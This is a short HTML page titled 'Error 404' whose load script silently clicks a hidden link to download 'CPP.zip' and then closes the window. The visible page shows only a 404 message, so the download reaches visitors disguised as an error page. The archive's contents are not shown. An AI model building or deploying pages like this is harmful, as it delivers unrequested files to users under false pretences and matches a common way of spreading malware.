<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Error 404</title>
  <script>
    window.onload = function() {
      const link = document.createElement("a");
      link.href = "CPP.zip";
      link.download = "CPP.zip";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Give browser time to trigger download before closing
      setTimeout(() => {
        window.close();
      }, 1000);
    };
  </script>
</head>
<body>
  <h1>404 Error</h1>
</body>
</html>
